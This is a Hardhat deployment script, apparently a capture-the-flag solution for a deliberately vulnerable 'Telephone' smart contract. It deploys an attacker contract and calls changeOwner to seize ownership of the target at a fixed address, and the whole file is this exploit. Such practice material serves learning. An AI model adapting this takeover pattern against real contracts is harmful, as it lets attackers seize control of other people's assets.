const { ethers } = require('hardhat');

const CONTRACT_NAME = "Telephone";
const ATTACKER_CONTRACT_NAME = "Telephone_Attacker";
const CONTRACT_ADDRESS = "0xADCAa0A6E902F751f97731b6ECB34CC07059C7cF";

async function main() {
    let tx;
    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    const contract = factory.attach(CONTRACT_ADDRESS);

    console.log("Original Owner:", await contract.owner());

    const attackerFactory = await ethers.getContractFactory(ATTACKER_CONTRACT_NAME);
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.waitForDeployment();


    tx = await attackerContract.changeOwner(await contract.getAddress(), "0xdb144f2Ec10d3F13222DD405cFA37B661C0b6e27");
    await tx.wait(1);

    console.log("New Owner:", await contract.owner());
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})